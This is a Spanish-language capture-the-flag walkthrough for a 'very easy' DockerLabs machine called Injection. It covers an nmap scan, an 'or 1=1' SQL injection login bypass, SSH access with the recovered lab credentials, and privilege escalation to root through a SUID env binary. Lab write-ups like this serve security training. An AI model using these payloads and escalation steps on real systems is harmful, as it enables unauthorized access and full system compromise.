# Máquina Injection
- Dificultad: muy fácil

# Comprobamos la conexión:
<p>Primero comprobaremos si tenemos conexión con la maquina Injection: </p>

```
ping -c 3 172.17.0.2

```
<p>Al realizar este comando enviará solo 3 paquetes ping a dirección ip designada (172.17.0.2) y luego terminará.</p>

## Escaneo con nmap
<p>Ahora haremos un escaneo de puertos con la herramienta nmap</p>

```

sudo nmap -p- -sS -sC --open -sV --min-rate=5000 -n -vvv -Pn 172.17.0.2 -oN /home/kali/Escritorio/dockerlabs_maquinas/maquinas_muy_faciles/maquina_injection_muyfacil/escaneo_maquina_inyection 

```
<p>Explicación de lo que estamos ejecutando en este comando:</p>


`-p-`

* Escanea **todos los 65535 puertos TCP**, no solo los comunes.


`-sS`

* Realiza un **escaneo SYN sigiloso.**


`-sC`

* Usa los **scripts por defecto** de Nmap, esto puede ayudar a obtener más información de servicios detectados (como banners, vulnerabilidades simples, etc.).


`--open`

* Muestra **solo puertos abiertos**.


`-sV`

* Detecta la **versión de los servicios** que corren en los puertos abiertos.


`--min-rate=5000`

* Fuerza una **velocidad mínima de 5000 paquetes por segundo**.


`-n`

* Desactiva la **resolución DNS**.


`-vvv`

* Modo **muy detallado** de salida (`-v` = verbose, `-vv` = más verboso, `-vvv` = máximo).


`-Pn`

* Le dice a Nmap que **no haga ping al host** antes de escanear.


`-oN <ruta>`

* Guarda la salida del escaneo en **la ruta que hayamos seleccionado ** en mi caso:  /home/kali/Escritorio/dockerlabs_maquinas/maquinas_muy_faciles/maquina_injection_muyfacil/escaneo_maquina_inyection.


```

Host is up, received arp-response (0.0000080s latency).
Scanned at 2025-05-15 21:58:36 EDT for 7s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ9UrfkzVjvriOVFwT9rOHz6XGJrVwKK/A6RMody6c0ovLNeCgaU6kCb+dGPPeXwCaio++IwxYm0SxRGYITrhr4=
|   256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJV4CYnqtqSQxWkpfq7xR8DG/nHJfLXDhtkyMHA5pLhO
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Iniciar Sesi\xC3\xB3n
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
<p>Podemos observar que el puerto 22 y el 80 están abiertos</p>

<p>colocamos la dirección ip 172.17.0.2 en el navegador, nos pidira que ingresemos el usuarios y la contraseña:</p>

imagen


<p>Probamos un ataque de inyeccionSQL</p>

```
 'or 1=1-- - 

```

imagen 

<p>Obtuvimos un usuario y contraseña:</p>

```
user : dylan
contraseña: KJSDFG789FGSDF78

```

Imagen 

<p>Probamos para conectarnos por SSH:</p>

```
ssh dylan@172.17.0.2
contraseña: KJSDFG789FGSDF78

```

# Escala de Privilegios
<p>Buscamos binarios con permisos SUID.</p>

```
find / -perm -4000 -user root 2>/dev/null

```
```
dylan@c890d134d17f:~$ find / -perm -4000 -user root 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/mount
/usr/bin/env
/usr/bin/chsh
dylan@c890d134d17f:~$ 

```

<p>Aparece el binario /usr/bin/env asi, el binario env tiene permisos SUID, tiene una escalada de privilegios.</p>

```
./env /bin/sh -p

```

<p>Al ejecutarlo nos figura este error.</p>

```
-bash: ./env: No such file or directory

```

<p>Para solucionarlo, tenemos que ejecutarlo en el directorio /usr/bin .</p>

```
dylan@c890d134d17f:/usr/bin$ ./env /bin/sh -p
# whoami
root
